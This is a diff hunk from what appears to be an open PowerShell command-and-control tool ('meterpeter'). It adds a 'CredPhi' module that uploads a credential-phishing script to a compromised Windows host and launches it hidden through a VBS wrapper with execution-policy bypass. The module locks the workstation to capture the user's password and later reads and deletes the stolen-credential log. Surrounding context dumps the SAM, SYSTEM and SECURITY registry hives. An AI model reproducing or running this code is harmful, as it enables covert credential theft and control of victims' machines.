@@ -1403,6 +1403,62 @@ While($Client.Connected)
         write-host " [sam|system|security] Remote Dump Directory: '`$env:tmp'" -ForeGroundColor yellow;write-host "`n`n";Start-Sleep -Seconds 2;
         $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R reg save hklm\system system;cmd /R reg save hklm\sam sam;cmd /R reg save hklm\security security;dir `$env:tmp `> `$env:localappdata\dellog.txt;Get-content `$env:localappdata\dellog.txt;Remove-Item `$env:localappdata\dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";       
       }
+      If($choise -eq "CredPhi" -or $choise -eq "credphi")
+      {
+        write-host "`n   Requirements" -ForegroundColor Yellow;
+        write-host "   ------------";
+        write-host "   This Module will allow attacker to Lock Target workstation and request";
+        write-host "   a valid UserAccount password to UnLock it, while in background it stores ";
+        write-host "   the credentials into a remote logfile under `$env:tmp folder to later review.";
+        write-host "`n`n   Modules     Description                  Remark" -ForegroundColor green;
+        write-host "   -------     -----------                  ------";
+        write-host "   exploit     Phish for remote creds       Client:User  - Privileges required";
+        write-host "   ReadLog     Read phishing logFile        Client:User  - Privileges required";
+        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "`n`n :meterpeter:Post:CredPhi> " -NoNewline -ForeGroundColor Green;
+        $cred_choise = Read-Host;
+        If($cred_choise -eq "exploit" -or $cred_choise -eq "exploit")
+        {
+          $name = "CredsPhish.ps1";
+          $File = "$Bin$name"
+          write-host " Phishing for Remote Credentials (logon)" -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 2;
+          If(([System.IO.File]::Exists("$File")))
+          {
+            ## Write Local script (CredsPhish.ps1) to Remote-Host $env:tmp
+            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
+            $FileBytes = "($FileBytes)";
+            $File = $File.Split('\')[-1];
+            $File = $File.Split('/')[-1];
+            ## Use powershell -version 2 in VBS trigger IF available
+            # check for v2: Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
+            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -version 2 -Exec Bypass -Win 1 -File %tmp%\CredsPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;remove-Item test.log -Force;cmd /R %tmp%\CredsPhish.vbs}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File %tmp%\CredsPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;remove-Item test.log -Force;cmd /R %tmp%\CredsPhish.vbs}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File %tmp%\CredsPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;cmd /R %tmp%\CredsPhish.vbs}";
+            $Command = $Command -replace "#","$File";
+            $Command = $Command -replace "@","$FileBytes";
+            $Upload = $True;
+          }else{
+            ## Local File { CredsPhish.ps1 } not found .
+            Write-Host "`n`n   Status     Local Path" -ForeGroundColor green;
+            Write-Host "   ------     ----------";
+            Write-Host "   Not Found  $File" -ForeGroundColor red;
+            $File = $Null;
+            $Command = $Null;
+            $Upload = $False; 
+          }
+        }
+        If($cred_choise -eq "ReadLog" -or $cred_choise -eq "ReadLog")
+        {
+          write-host " Read Remote-Host Credential LogFile" -ForeGroundColor blue -BackGroundColor white;Start-Sleep -Seconds 1;write-host "`n";
+          $Command = "If(([System.IO.File]::Exists(`"`$env:tmp\CredsPhish.log`"))){Get-Content `$env:tmp\CredsPhish.log `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force;Remove-Item `$env:tmp\CredsPhish.ps1 -Force;Remove-Item `$env:tmp\CredsPhish.log -Force}else{echo `"   [i] File: `$env:tmp\CredsPhish.log Not Found in Remote System`" `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force;Remove-Item `$env:tmp\CredsPhish.ps1 -Force}";
+        }
+        If($cred_choise -eq "Return" -or $cred_choise -eq "return" -or $cred_choise -eq "cls" -or $cred_choise -eq "Modules" -or $cred_choise -eq "modules" -or $cred_choise -eq "clear")
+        {
+          $choise = $Null;
+          $Command = $Null;
+        }
+        $cred_choise = $Null;
+      }
+
+
       If($choise -eq "Return" -or $choice -eq "return" -or $choise -eq "cls" -or $choise -eq "Modules" -or $choise -eq "modules" -or $choise -eq "clear")
       {
         $choise = $Null;
